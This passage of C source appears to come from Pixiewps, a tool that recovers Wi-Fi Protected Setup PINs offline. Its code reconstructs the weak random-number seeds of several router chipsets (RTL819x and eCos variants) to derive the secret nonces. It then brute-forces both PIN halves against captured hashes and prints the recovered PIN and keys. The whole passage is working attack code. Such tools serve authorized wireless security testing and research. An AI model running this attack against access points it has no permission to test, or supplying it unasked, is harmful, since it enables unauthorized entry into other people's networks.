								__FILE__, __LINE__, __func__, (unsigned long) wps->start, buffer);
							ts = *gmtime(&wps->end);
							strftime(buffer, 30, "%c", &ts);
							printf("\n [DEBUG] %s:%d:%s(): End:   %10lu (%s UTC)",
								__FILE__, __LINE__, __func__, (unsigned long) wps->end, buffer);
							fflush(stdout);
						}
						#endif

						nonce_seed = collect_crack_jobs();

						struct glibc_prng glibc_prng;

						if (nonce_seed) { /* Seed found */
							int32_t res;
							int i = 0; /* Must hold MODE3_TRIES */
							uint8_t tmp_s_nonce[16];

							DEBUG_PRINT("Trying forward in time");

							do {
								i++;
								glibc_seed(&glibc_prng, nonce_seed + i);
								for (uint_fast8_t j = 0; j < 4; j++) {
									uint32_t be = h32_to_be(glibc_rand(&glibc_prng));
									memcpy(&(wps->e_s1[4 * j]), &be, sizeof(uint32_t));
								}
								memcpy(wps->e_s2, wps->e_s1, WPS_SECRET_NONCE_LEN); /* E-S1 = E-S2 != E-Nonce */
								s1_seed = nonce_seed + i;
								s2_seed = nonce_seed + i;

								DEBUG_PRINT("Trying (%10u) with E-S1: ", s1_seed);
								DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
								DEBUG_PRINT("Trying (%10u) with E-S2: ", s2_seed);
								DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);

								uint_fast8_t r = crack(wps, pin);
								if (r == PIN_FOUND) {
									found_p_mode = RTL819x;
									DEBUG_PRINT("Pin found");
								} else if (r == PIN_ERROR) {
									if (i == 1) {
										memcpy(wps->e_s1, wps->e_nonce, WPS_SECRET_NONCE_LEN); /* E-S1 = E-Nonce != E-S2 */
										memcpy(tmp_s_nonce, wps->e_s2, WPS_SECRET_NONCE_LEN);  /* Chaching for next round, see below */
									} else {
										memcpy(wps->e_s1, tmp_s_nonce, WPS_SECRET_NONCE_LEN);
										memcpy(tmp_s_nonce, wps->e_s2, WPS_SECRET_NONCE_LEN);  /* E-S1 = old E-S1, E-S2 = new E-S2 */
									}
									s1_seed = nonce_seed + i - 1;
									s2_seed = nonce_seed + i;

									DEBUG_PRINT("Trying (%10u) with E-S1: ", s1_seed);
									DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
									DEBUG_PRINT("Trying (%10u) with E-S2: ", s2_seed);
									DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);

									uint_fast8_t r2 = crack(wps, pin);
									if (r2 == PIN_FOUND) {
										found_p_mode = RTL819x;
										DEBUG_PRINT("Pin found");
									} else if (r2 == MEM_ERROR) {
										goto memory_err;
									}
								} else if (r == MEM_ERROR) {
									goto memory_err;
								}
							} while (found_p_mode == NONE && i <= MODE3_TRIES);

							if (found_p_mode == NONE) {
								DEBUG_PRINT("Trying backwards in time");

								i = 0;
								do {
									i++;
									glibc_seed(&glibc_prng, nonce_seed - i);
									for (uint_fast8_t j = 0; j < 4; j++) {
										uint32_t be = h32_to_be(glibc_rand(&glibc_prng));
										memcpy(&(wps->e_s1[4 * j]), &be, sizeof(uint32_t));
									}
									memcpy(wps->e_s2, wps->e_s1, WPS_SECRET_NONCE_LEN); /* E-S1 = E-S2 != E-Nonce */
									s1_seed = nonce_seed - i;
									s2_seed = nonce_seed - i;

									DEBUG_PRINT("Trying (%10u) with E-S1: ", s1_seed);
									DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
									DEBUG_PRINT("Trying (%10u) with E-S2: ", s2_seed);
									DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);

									uint_fast8_t r = crack(wps, pin);
									if (r == PIN_FOUND) {
										found_p_mode = RTL819x;
										DEBUG_PRINT("Pin found");
									} else if (r == PIN_ERROR) {
										if (i == 1) {
											memcpy(wps->e_s2, wps->e_nonce, WPS_SECRET_NONCE_LEN); /* E-S1 = E-Nonce != E-S2 */
											memcpy(tmp_s_nonce, wps->e_s1, WPS_SECRET_NONCE_LEN);  /* Chaching for next round, see below */
										} else {
											memcpy(wps->e_s2, tmp_s_nonce, WPS_SECRET_NONCE_LEN);
											memcpy(tmp_s_nonce, wps->e_s1, WPS_SECRET_NONCE_LEN);  /* E-S1 = old E-S1, E-S2 = new E-S2 */
										}
										s1_seed = nonce_seed - i;
										s2_seed = nonce_seed - i + 1;

										DEBUG_PRINT("Trying (%10u) with E-S1: ", s1_seed);
										DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
										DEBUG_PRINT("Trying (%10u) with E-S2: ", s2_seed);
										DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);

										uint_fast8_t r2 = crack(wps, pin);
										if (r2 == PIN_FOUND) {
											found_p_mode = RTL819x;
											DEBUG_PRINT("Pin found");
										} else if (r2 == MEM_ERROR) {
											goto memory_err;
										}
									} else if (r == MEM_ERROR) {
										goto memory_err;
									}
								} while (found_p_mode == NONE && i <= MODE3_TRIES);
							}
						}

						if (found_p_mode == NONE && !wps->bruteforce) {
							if (!wps->warning) {
								wps->warning = calloc(256, 1);
								if (!wps->warning)
									goto memory_err;
								snprintf(wps->warning, 256, " [!] The AP /might be/ vulnerable. Try again with --force or with another (newer) set of data.\n\n");
							}
						}
					}
				}
			}

		/* 4 */
		} else if (p_mode[k] == ECOS_SIMPLEST && wps->e_nonce) {

			DEBUG_PRINT(" * Mode: %d (%s)", ECOS_SIMPLEST, p_mode_name[ECOS_SIMPLEST]);

			uint32_t index = 0;
			do {
				seed = index;
				uint_fast8_t i;
				for (i = 0; i < WPS_NONCE_LEN; i++) {
					if (wps->e_nonce[i] != (uint8_t) ecos_rand_simplest(&seed))
						break;
				}
				if (i == WPS_NONCE_LEN) { /* Seed found */
					nonce_seed = seed;

					for (i = 0; i < WPS_SECRET_NONCE_LEN; i++) /* Advance to get E-S1 */
						wps->e_s1[i] = (uint8_t) ecos_rand_simplest(&seed);

					for (i = 0; i < WPS_SECRET_NONCE_LEN; i++) /* Advance to get E-S2 */
						wps->e_s2[i] = (uint8_t) ecos_rand_simplest(&seed);

					DEBUG_PRINT("Seed found");
					break;
				}
				index++;
			} while (index != 0xffffffff);

			if (nonce_seed) { /* Seed found */

				DEBUG_PRINT("Trying with E-S1: ");
				DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
				DEBUG_PRINT("Trying with E-S2: ");
				DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);

				uint_fast8_t r = crack(wps, pin);
				if (r == PIN_FOUND) {
					found_p_mode = ECOS_SIMPLEST;
					DEBUG_PRINT("Pin found");
				} else if (r == MEM_ERROR) {
					goto memory_err;
				}
			}

		/* 5 */
		} else if (p_mode[k] == ECOS_KNUTH && wps->e_nonce) {

			DEBUG_PRINT(" * Mode: %d (%s)", ECOS_KNUTH, p_mode_name[ECOS_KNUTH]);

			uint32_t index = 0;
			do {
				seed = index;
				uint_fast8_t i;
				for (i = 0; i < WPS_NONCE_LEN; i++) {
					if (wps->e_nonce[i] != (uint8_t) ecos_rand_knuth(&seed))
						break;
				}
				if (i == WPS_NONCE_LEN) { /* Seed found */
					nonce_seed = seed;

					for (i = 0; i < WPS_SECRET_NONCE_LEN; i++) /* Advance to get E-S1 */
						wps->e_s1[i] = (uint8_t) ecos_rand_knuth(&seed);

					for (i = 0; i < WPS_SECRET_NONCE_LEN; i++) /* Advance to get E-S2 */
						wps->e_s2[i] = (uint8_t) ecos_rand_knuth(&seed);

					DEBUG_PRINT("Seed found");
					break;
				}
				index++;
			} while (index != 0xffffffff);

			if (nonce_seed) { /* Seed found */

				DEBUG_PRINT("Trying with E-S1: ");
				DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
				DEBUG_PRINT("Trying with E-S2: ");
				DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);

				uint_fast8_t r = crack(wps, pin);
				if (r == PIN_FOUND) {
					found_p_mode = ECOS_KNUTH;
					DEBUG_PRINT("Pin found");
				} else if (r == MEM_ERROR) {
					goto memory_err;
				}
			}

		}

		k++;
	}

	gettimeofday(&t_end, 0);
	unsigned long ms_elapsed = get_elapsed_ms(&t_start, &t_end);

	k--;

#ifdef DEBUG
	puts("");
#endif

	printf("\n Pixiewps %s\n", SHORT_VERSION);

	if (found_p_mode) {
		if (wps->verbosity > 1) {
			printf("\n [*] Mode:       %u (%s)", found_p_mode, p_mode_name[found_p_mode]);
		}
		if (wps->e_nonce) {
			if (wps->verbosity > 2) {
				if ((found_p_mode == ECOS_SIMPLE || (found_p_mode == RTL819x && nonce_seed)
					|| found_p_mode == ECOS_SIMPLEST || found_p_mode == ECOS_KNUTH)) {

					printf("\n [*] Seed nonce: %u", nonce_seed);
				}
				if (found_p_mode == RTL819x && nonce_seed) {
					time_t seed_time;
					struct tm ts;
					char buffer[30];

					seed_time = nonce_seed;
					ts = *gmtime(&seed_time);
					strftime(buffer, 30, "%c", &ts);
					printf(" (%s UTC)", buffer);
					printf("\n [*] Seed E-S1:  %u", s1_seed);
					seed_time = s1_seed;
					ts = *gmtime(&seed_time);
					strftime(buffer, 30, "%c", &ts);
					printf(" (%s UTC)", buffer);
					printf("\n [*] Seed E-S2:  %u", s2_seed);
					seed_time = s2_seed;
					ts = *gmtime(&seed_time);
					strftime(buffer, 30, "%c", &ts);
					printf(" (%s UTC)", buffer);
				}
			}
		}
		if (wps->verbosity > 2) {
			if (wps->dhkey) { /* To see if AuthKey was supplied or not */
				printf("\n [*] DHKey:      "); byte_array_print(wps->dhkey, WPS_HASH_LEN);
				printf("\n [*] KDK:        "); byte_array_print(wps->kdk, WPS_HASH_LEN);
				printf("\n [*] AuthKey:    "); byte_array_print(wps->authkey, WPS_AUTHKEY_LEN);
				printf("\n [*] EMSK:       "); byte_array_print(wps->emsk, WPS_EMSK_LEN);
				printf("\n [*] KeyWrapKey: "); byte_array_print(wps->wrapkey, WPS_KEYWRAPKEY_LEN);
			}
			printf("\n [*] PSK1:       "); byte_array_print(wps->psk1, WPS_PSK_LEN);
			printf("\n [*] PSK2:       "); byte_array_print(wps->psk2, WPS_PSK_LEN);
		}
		if (wps->verbosity > 1) {
			printf("\n [*] E-S1:       "); byte_array_print(wps->e_s1, WPS_SECRET_NONCE_LEN);
			printf("\n [*] E-S2:       "); byte_array_print(wps->e_s2, WPS_SECRET_NONCE_LEN);
		}
		if (pin[0] == '\0') {
			printf("\n [+] WPS pin:    <empty>");
		} else {
			printf("\n [+] WPS pin:    %s", pin);
		}
	} else {
		printf("\n [-] WPS pin not found!");
	}
	printf("\n\n [*] Time taken: %lu s %lu ms\n\n", ms_elapsed / 1000, ms_elapsed % 1000);

	if (wps->warning) {
		printf("%s", wps->warning);
		free(wps->warning);
	}

	free(wps->pke);
	free(wps->pkr);
	free(wps->e_hash1);
	free(wps->e_hash2);
	free(wps->authkey);
	free(wps->e_nonce);
	free(wps->r_nonce);
	free(wps->e_bssid);
	free(wps->psk1);
	free(wps->psk2);
	free(wps->e_s1);
	free(wps->e_s2);
	free(wps->error);

	if (wps->verbosity > 2) {
		free(wps->dhkey);
		free(wps->kdk);
		free(wps->wrapkey);
		free(wps->emsk);
	}

	free(wps);

	return found_p_mode != 0 ? PIN_FOUND : PIN_ERROR;
}

/* Simplest */
uint32_t ecos_rand_simplest(uint32_t *seed) {
	*seed = (*seed * 1103515245) + 12345; /* Permutate seed */
	return *seed;
}

/* Simple, Linear congruential generator */
uint32_t ecos_rand_simple(uint32_t *seed) {
	uint32_t s = *seed;
	uint32_t uret;

	s = (s * 1103515245) + 12345;          /* Permutate seed */
	uret = s & 0xffe00000;                 /* Use top 11 bits */
	s = (s * 1103515245) + 12345;          /* Permutate seed */
	uret += (s & 0xfffc0000) >> 11;        /* Use top 14 bits */
	s = (s * 1103515245) + 12345;          /* Permutate seed */
	uret += (s & 0xfe000000) >> (11 + 14); /* Use top 7 bits */

	*seed = s;
	return uret;
}

/* Mersenne-Knuth */
uint32_t ecos_rand_knuth(uint32_t *seed) {
	#define MM 2147483647 /* Mersenne prime */
	#define AA 48271      /* This does well in the spectral test */
	#define QQ 44488      /* MM / AA */
	#define RR 3399       /* MM % AA, important that RR < QQ */

	*seed = AA * (*seed % QQ) - RR * (*seed / QQ);
	if (*seed & 0x80000000)
		*seed += MM;

	return *seed;
}

/* Simple power function */
int int_pow(int a, int exp) {
	if (exp <= 0) return 1;
	int r = a;

	while (--exp) r *= a;
	return r;
}

/* PIN cracking attempt */
uint_fast8_t crack(struct global *g, char *pin) {
	struct global *wps = g;
	unsigned int first_half = 0;
	unsigned int second_half = 0;
	uint8_t s_pin[4];
	char mask[5];
	uint_fast8_t found = 0;

	uint8_t *buffer = malloc(WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN * 2);
	if (!buffer)
		return MEM_ERROR;

	uint8_t *result = malloc(WPS_HASH_LEN);
	if (!result) {
		free(buffer);
		return MEM_ERROR;
	}

	if (wps->anylength) {

		/* Brute-force entire pin space */
		for (unsigned int i = 0; i < 5; i++) {
			unsigned int count = int_pow(10, i);

			first_half = 0;
			while (first_half < count) {
				uint_to_char_array(first_half, i, s_pin);
				hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, s_pin, i, wps->psk1);
				memcpy(buffer, wps->e_s1, WPS_SECRET_NONCE_LEN);
				memcpy(buffer + WPS_SECRET_NONCE_LEN, wps->psk1, WPS_PSK_LEN);
				memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN, wps->pke, WPS_PKEY_LEN);
				memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN, wps->pkr, WPS_PKEY_LEN);
				hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, buffer,
					WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN * 2, result);

				if (memcmp(result, wps->e_hash1, WPS_HASH_LEN)) {
					first_half++;
				} else {
					if (i == 0)
					{
						pin[0] = '\0';
					} else {
						snprintf((char *)&mask, 5, "%%0%uu", i);
						snprintf(pin, WPS_PIN_LEN / 2 + 1, mask, first_half);
					}
					break;
				}
			}

			if (first_half < count) {
				for (unsigned int j = 0; j < 5; j++) {
					count = int_pow(10, j);

					second_half = 0;
					while (second_half < count) {
						uint_to_char_array(second_half, j, s_pin);
						hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, s_pin, j, wps->psk2);
						memcpy(buffer, wps->e_s2, WPS_SECRET_NONCE_LEN);
						memcpy(buffer + WPS_SECRET_NONCE_LEN, wps->psk2, WPS_PSK_LEN);
						memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN, wps->pke, WPS_PKEY_LEN);
						memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN, wps->pkr, WPS_PKEY_LEN);
						hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, buffer,
							WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN * 2, result);

						if (memcmp(result, wps->e_hash2, WPS_HASH_LEN)) {
							second_half++;
						} else {
							if (j > 0)
							{
								snprintf((char *)&mask, 5, "%%0%uu", j);
								snprintf(pin + WPS_PIN_LEN / 2, WPS_PIN_LEN / 2 + 1, mask, second_half);
							}
							/* Second half found */
							found = 1;
							break;
						}
					}
				}
				/* First half found, but not second */
				break;
			}
		}
		free(buffer);
		free(result);

		return !found;
	}

	/* Check for empty pin (length = 0) */
	hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, NULL, 0, wps->psk1);
	memcpy(buffer, wps->e_s1, WPS_SECRET_NONCE_LEN);
	memcpy(buffer + WPS_SECRET_NONCE_LEN, wps->psk1, WPS_PSK_LEN);
	memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN, wps->pke, WPS_PKEY_LEN);
	memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN, wps->pkr, WPS_PKEY_LEN);
	hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, buffer,
		WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN * 2, result);

	if (!memcmp(result, wps->e_hash1, WPS_HASH_LEN)) {
		/* Second half must be empty too */
		hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, NULL, 0, wps->psk2);
		memcpy(buffer, wps->e_s2, WPS_SECRET_NONCE_LEN);
		memcpy(buffer + WPS_SECRET_NONCE_LEN, wps->psk2, WPS_PSK_LEN);
		memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN, wps->pke, WPS_PKEY_LEN);
		memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN, wps->pkr, WPS_PKEY_LEN);
		hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, buffer,
			WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN * 2, result);

		if (!memcmp(result, wps->e_hash2, WPS_HASH_LEN)) {
			/* Empty pin detected */
			free(buffer);
			free(result);

			pin[0] = '\0';
			return 0;
		}
	}

	/* Brute-force numeric pins */
	while (first_half < 10000) {
		uint_to_char_array(first_half, 4, s_pin);
		hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, s_pin, 4, wps->psk1);
		memcpy(buffer, wps->e_s1, WPS_SECRET_NONCE_LEN);
		memcpy(buffer + WPS_SECRET_NONCE_LEN, wps->psk1, WPS_PSK_LEN);
		memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN, wps->pke, WPS_PKEY_LEN);
		memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN, wps->pkr, WPS_PKEY_LEN);
		hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, buffer,
			WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN * 2, result);

		if (memcmp(result, wps->e_hash1, WPS_HASH_LEN)) {
			first_half++;
		} else {
			break;
		}
	}

	if (first_half < 10000) { /* First half found */

		/* Testing with checksum digit */
		while (second_half < 1000) {
			unsigned int checksum_digit = wps_pin_checksum(first_half * 1000 + second_half);
			unsigned int c_second_half = second_half * 10 + checksum_digit;
			uint_to_char_array(c_second_half, 4, s_pin);
			hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, s_pin, 4, wps->psk2);
			memcpy(buffer, wps->e_s2, WPS_SECRET_NONCE_LEN);
			memcpy(buffer + WPS_SECRET_NONCE_LEN, wps->psk2, WPS_PSK_LEN);
			memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN, wps->pke, WPS_PKEY_LEN);
			memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN, wps->pkr, WPS_PKEY_LEN);
			hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, buffer,
				WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN * 2, result);

			if (memcmp(result, wps->e_hash2, WPS_HASH_LEN)) {
				second_half++;
			} else {
				second_half = c_second_half;
				found = 1;
				break;
			}
		}

		/* Testing without checksum digit */
		if (!found) {
			second_half = 0;

			while (second_half < 10000) {

				/* If already tested skip */
				if (wps_pin_valid(first_half * 10000 + second_half)) {
					second_half++;
					continue;
				}

				uint_to_char_array(second_half, 4, s_pin);
				hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, s_pin, 4, wps->psk2);
				memcpy(buffer, wps->e_s2, WPS_SECRET_NONCE_LEN);
				memcpy(buffer + WPS_SECRET_NONCE_LEN, wps->psk2, WPS_PSK_LEN);
				memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN, wps->pke, WPS_PKEY_LEN);
				memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN, wps->pkr, WPS_PKEY_LEN);
				hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, buffer,
					WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN * 2, result);

				if (memcmp(result, wps->e_hash2, WPS_HASH_LEN)) {
					second_half++;
				} else {
					found = 1;
					break;
				}
			}
		}
	}

	free(buffer);
	free(result);

	snprintf(pin, WPS_PIN_LEN + 1, "%08u", first_half * 10000 + second_half);
	return !found; /* 0 success, 1 failure */
}
